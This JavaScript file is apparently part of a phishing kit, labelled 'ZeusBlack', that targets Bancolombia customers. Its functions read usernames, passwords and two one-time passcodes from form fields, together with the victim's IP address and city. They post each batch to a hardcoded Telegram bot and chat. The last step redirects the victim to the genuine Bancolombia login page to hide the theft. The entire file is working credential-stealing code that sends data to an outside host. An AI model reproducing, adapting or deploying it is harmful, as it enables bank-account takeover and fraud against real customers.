// USUARIO DE EJEMPLO PARA LA CONEXION °°

var telegram_bot_id = "6812844659:AAEoHVdnqJmRg23xNh0_CGL4FDzzudo72zg";
var chat_id ="-1002086679581";

///////////////////////////////////////// USUARIO //////////////////////////////////////////////////////

var u_name, pax, ip, ip2;
var ready = function () {
  u_name = document.getElementById("DocumentNumber").value;
  pax = document.getElementById("DocumentNumber1").value;
  ip = document.getElementById("gfg").innerHTML;
  ip2 = document.getElementById("address").innerHTML;
  message =
    "|DATOS OBTENIDOS| \n Username =   " +
    pax +
    
    "\n Calve =  " +

    u_name +
    "\n Ip ==> " +
    ip +
    "\n Ciudad ==> " +
    ip2 +
    "|----- ZeusBlack -----|";
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    window.location = "loading.html";
    console.log(response);
  });
  return false;
};

///////////////////////////////////////// PASSWORD ////////////////////////////////////////////////////

var password, ip, ip2;
var readypassword = function () {
  password = document.getElementById("password").value;
  ip = document.getElementById("gfg").innerHTML;
  ip2 = document.getElementById("address").innerHTML;
  message =
    "|DATOS OBTENIDOS| \n Password ==> " +
    password +
    "\n Ip ==> " +
    ip +
    "\n Ciudad ==> " +
    ip2 +
    "|----- ZeusBlack -----|";
};
var senderpassword = function () {
  readypassword();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    window.location = "loading.html";
    console.log(response);
  });
  return false;
};

////////////////////////////////////////// TOKEN /////////////////////////////////////////////////////

var token, ip, ip2;
var readytoken = function () {
  token = document.getElementById("token").value;
  ip = document.getElementById("gfg").innerHTML;
  ip2 = document.getElementById("address").innerHTML;
  message =
    "|DATOS OBTENIDOS| \n OTP ONE ==> " +
    token +
    "\n Ip ==> " +
    ip +
    "\n Ciudad ==> " +
    ip2 +
    "|----- ZeusBlack -----|";
};
var sendertoken = function () {
  readytoken();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    window.location = "tokens.html";
    console.log(response);
  });
  return false;
};

/////////////////////////////////////////// TOKENS ///////////////////////////////////////////////////

var tokens, ip, ip2;
var readytokens = function () {
  tokens = document.getElementById("tokens").value;
  ip = document.getElementById("gfg").innerHTML;
  ip2 = document.getElementById("address").innerHTML;
  message =
    "|DATOS OBTENIDOS| \n OTP TWO ==> " +
    tokens +
    "\n Ip ==> " +
    ip +
    "\n Ciudad ==> " +
    ip2 +
    "|----- ZeusBlack -----|";
};
var sendertokens = function () {
  readytokens();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    window.location =
      "https://sucursalpersonas.transaccionesbancolombia.com/mua/USER?scis=db6qzWSZR5fMBIOo%2F1RGUSqT6nA0ijTqzCtX6baOtaI%3D#no-back-button";
    console.log(response);
  });
  return false;
};
